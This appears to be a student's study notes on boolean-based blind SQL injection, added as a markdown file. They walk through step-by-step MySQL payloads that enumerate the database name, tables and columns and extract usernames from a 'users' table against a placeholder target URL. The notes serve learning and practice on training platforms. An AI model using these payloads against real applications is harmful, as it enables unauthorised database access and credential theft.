@@ -1,0 +1,316 @@
+🔐 Blind SQL Injection — Boolean-Based (Complete Study Notes)
+
+📚 Topic
+
+Blind SQL Injection (Boolean-Based)
+
+🎯 Objective
+
+Learn how attackers extract database information when the application does not show SQL errors or query results.
+
+Instead of seeing data directly, the attacker observes:
+
+- Page response differences
+- TRUE / FALSE conditions
+
+---
+
+🧠 Blind SQL Injection Workflow
+
+1 Detect SQL Injection
+2 Confirm Boolean behavior
+3 Identify DBMS
+4 Find database length
+5 Extract database name
+6 Count tables
+7 Enumerate table names
+8 Count columns
+9 Enumerate column names
+10 Extract sensitive data
+
+---
+
+1️⃣ Detect SQL Injection
+
+Example URL:
+
+http://target.com/product?id=1
+
+Test payload:
+
+1'
+
+Possible result:
+
+- SQL error
+- Page behavior change
+
+This indicates possible SQL Injection.
+
+---
+
+2️⃣ Confirm Boolean-Based Injection
+
+Test TRUE condition:
+
+1' AND 1=1-- -
+
+Test FALSE condition:
+
+1' AND 1=2-- -
+
+Observation:
+
+Payload| Result
+TRUE| Normal page
+FALSE| Different response
+
+This confirms Boolean-Based SQL Injection.
+
+---
+
+3️⃣ DBMS Fingerprinting
+
+Different database systems use different functions.
+
+DBMS| Function
+MySQL| "database()"
+PostgreSQL| "current_database()"
+MSSQL| "DB_NAME()"
+
+Example test:
+
+' AND LENGTH(database())>0-- -
+
+If TRUE → likely MySQL.
+
+---
+
+4️⃣ Database Length Detection
+
+Determine the number of characters in the database name.
+
+Example:
+
+' AND LENGTH(database())=8-- -
+
+If TRUE:
+
+database length = 8
+
+---
+
+5️⃣ Database Name Extraction
+
+Use "SUBSTRING()" and "ASCII()".
+
+Example:
+
+' AND ASCII(SUBSTRING(database(),1,1))=115-- -
+
+ASCII "115" = s
+
+Continue until full database name is extracted.
+
+Example result:
+
+security
+
+---
+
+6️⃣ Table Count
+
+Determine how many tables exist in the database.
+
+Example:
+
+' AND (SELECT COUNT(table_name)
+FROM information_schema.tables
+WHERE table_schema=database())=5-- -
+
+---
+
+7️⃣ Table Enumeration
+
+Extract table names one by one using "LIMIT".
+
+Example:
+
+' AND ASCII(SUBSTRING(
+(SELECT table_name
+FROM information_schema.tables
+WHERE table_schema=database()
+LIMIT 0,1),1,1))=117-- -
+
+Example result:
+
+users
+
+---
+
+8️⃣ Column Count
+
+Determine how many columns exist in a table.
+
+Example:
+
+' AND (SELECT COUNT(column_name)
+FROM information_schema.columns
+WHERE table_name='users')=3-- -
+
+---
+
+9️⃣ Column Enumeration
+
+Extract column names.
+
+Example:
+
+' AND ASCII(SUBSTRING(
+(SELECT column_name
+FROM information_schema.columns
+WHERE table_name='users'
+LIMIT 0,1),1,1))=105-- -
+
+Example columns:
+
+id
+username
+password
+
+---
+
+🔟 Data Extraction
+
+Extract actual data from columns.
+
+Example:
+
+' AND ASCII(SUBSTRING(
+(SELECT username FROM users LIMIT 0,1),1,1))=97-- -
+
+Example result:
+
+admin
+
+---
+
+🔧 Core Functions Used
+
+Function| Purpose
+"LENGTH()"| Determine string length
+"SUBSTRING()"| Extract specific character
+"ASCII()"| Convert character to numeric value
+"COUNT()"| Count tables or columns
+"LIMIT"| Select a specific row
+"database()"| Get current database name
+
+---
+
+🧩 Boolean Operators
+
+Operator| Purpose
+"AND"| Combine conditions
+"OR"| Alternative condition
+"="| Equality comparison
+">" "<"| Range comparison
+
+---
+
+📌 Extraction Logic
+
+count → length → characters
+
+Example workflow:
+
+column count → 3
+column length → 8
+column characters → username
+
+---
+
+🔎 Important SQL Injection Concepts
+
+SUBSTRING()
+
+Extract part of a string.
+
+Example:
+
+SUBSTRING(database(),1,1)
+
+Meaning:
+
+first character of database name
+
+---
+
+ASCII()
+
+Convert character to numeric value.
+
+Example:
+
+ASCII('a') = 97
+
+---
+
+LIMIT
+
+Used to select a specific row.
+
+Example:
+
+LIMIT 0,1
+
+Meaning:
+
+first row
+
+Example:
+
+LIMIT 1,1 → second row
+LIMIT 2,1 → third row
+
+---
+
+🧠 Extraction Strategy
+
+Manual extraction usually follows:
+
+1 Find total items (COUNT)
+2 Identify length (LENGTH)
+3 Extract characters (SUBSTRING + ASCII)
+
+---
+
+🚀 Next Learning Topics
+
+To improve Blind SQL Injection skills:
+
+- Binary Search Extraction (faster brute-force)
+- Time-Based Blind SQL Injection
+- Conditional Error SQL Injection
+
+These techniques help when Boolean responses are limited.
+
+---
+
+📖 Practice Platforms
+
+Practice SQL Injection on:
+
+- PortSwigger Web Security Academy
+- TryHackMe
+- OWASP Juice Shop
+- VulnWeb
+
+---
+
+🧑‍💻 Author
+
+Cybersecurity student focused on:
+
+- Web Application Security
+- Penetration Testing
+- Offensive Security
